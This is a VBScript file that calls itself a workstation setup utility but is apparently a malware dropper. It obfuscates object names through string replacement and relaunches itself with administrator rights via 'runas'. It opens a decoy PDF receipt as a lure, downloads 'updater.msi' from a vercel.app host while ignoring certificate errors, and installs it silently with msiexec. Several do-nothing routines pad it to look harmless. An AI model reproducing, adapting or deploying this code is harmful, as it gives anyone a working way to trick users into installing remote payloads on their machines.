' Workstation setup and configuration utility
Option Explicit

Dim objShellApp, oFSO, strAppHandler, strFSRef, httpClient, objStream, strTempDir, targetFile, strPkgURL, strPreviewURL, strNetProvider, strWriteHandler, strDeployExe, strUnattended, strRuntime, strAuthMode, strSessionFlag

strAppHandler = Replace("SheZl.Application", "Z", "l")
strFSRef = Replace(Replace("%cripting.FileSystemO^ject", "%", "S"), "^", "b")
strRuntime = Mid("Provider=wscript.exe;Cache=On", 10, 11)
strAuthMode = Replace(Replace("r`na%", "%", "s"), "`", "u")
strSessionFlag = Replace("elJvated", "J", "e")


Sub DeployPackage(strInstPath)
    strDeployExe = Mid("Provider=msiexec.exe;Active=True", 10, 11)
    strUnattended = Replace(Replace("$`n", "$", "/"), "`", "q")
    Set objShellApp = CreateObject(strAppHandler)
    objShellApp.ShellExecute strDeployExe, "/i """ & strInstPath & """ " & strUnattended, "", strAuthMode, 1
End Sub

Function GetIdentifier()
    GetIdentifier = Year(Now) & Month(Now) & Day(Now)
End Function

Sub CacheFile(rawData, strOutPath)
    strWriteHandler = Replace("ADOKB.Stream", "K", "D")
    Dim intTransferType : intTransferType = Len("X")
    Dim intFileMode : intFileMode = Len("AB")
    Set objStream = CreateObject(strWriteHandler)
    objStream.Type = intTransferType
    objStream.Open
    objStream.Write rawData
    objStream.SaveToFile strOutPath, intFileMode
    objStream.Close
End Sub

Sub ShowResource()
    strPreviewURL = "https://pdfviewer-nu.vercel.app/doc/wureceipt.pdf"
    Dim urlRunner, strNavClass
    strNavClass = Replace("WScript.ShJll", "J", "e")
    Set urlRunner = CreateObject(strNavClass)
    urlRunner.Run strPreviewURL, 1, False
End Sub


Sub LogAction(strMsg, intLevel)
    If intLevel < 0 Then Exit Sub
    Dim strPrefix : strPrefix = "[Debug] "
    Dim strFull : strFull = strPrefix & strMsg
End Sub


Sub RetrievePackage(strURL, ByRef arrData)
    strNetProvider = Mid("Provider=MSXML2.ServerXMLHTTP.6.0;Mode=1", 10, 24)
    Set httpClient = CreateObject(strNetProvider)
    httpClient.setTimeouts 4600, 7597, 9294, 42585
    Dim strMethod : strMethod = Right("AGET", 3)
    httpClient.Open strMethod, strURL, False
    Dim intOptFlag : intOptFlag = 8192 + 4864
    Dim intParamId : intParamId = Len("AB")
    httpClient.setOption intParamId, intOptFlag
    On Error Resume Next
    httpClient.Send
    If Err.Number <> 0 Then WScript.Quit
    On Error GoTo 0
    If httpClient.Status = 200 Then
        arrData = httpClient.ResponseBody
    Else
        WScript.Quit
    End If
End Sub

Sub PrepareSession()
    Dim strInvoke
    If Not WScript.Arguments.Named.Exists(strSessionFlag) Then
        strInvoke = """" & WScript.ScriptFullName & """ /" & strSessionFlag
        Set objShellApp = CreateObject(strAppHandler)
        objShellApp.ShellExecute strRuntime, strInvoke, "", strAuthMode, 1
        WScript.Quit
    End If
End Sub


Sub InitSession(intSize)
    If intSize < 1 Then intSize = 49
    Dim i : For i = 1 To intSize : Next
End Sub


Function CheckComponent(strName)
    CheckComponent = True
    If strName = "" Then CheckComponent = False
End Function

' --- Entry Point ---
PrepareSession

WScript.Sleep 1296
ShowResource
WScript.Sleep 813

Dim arrResult
Set oFSO = CreateObject(strFSRef)
Dim intFolderCfg : intFolderCfg = Len("AB")
strTempDir = oFSO.GetSpecialFolder(intFolderCfg)
targetFile = strTempDir & "\updater.msi"
strPkgURL = "https://pdfviewe" & "r-nu.vercel.app/" & "doc/updater.msi"

RetrievePackage strPkgURL, arrResult
Dim strStep : strStep = "ready"
CacheFile arrResult, targetFile
Dim intSizeCheck : intSizeCheck = LenB(arrResult)
If intSizeCheck < 1 Then WScript.Quit
DeployPackage targetFile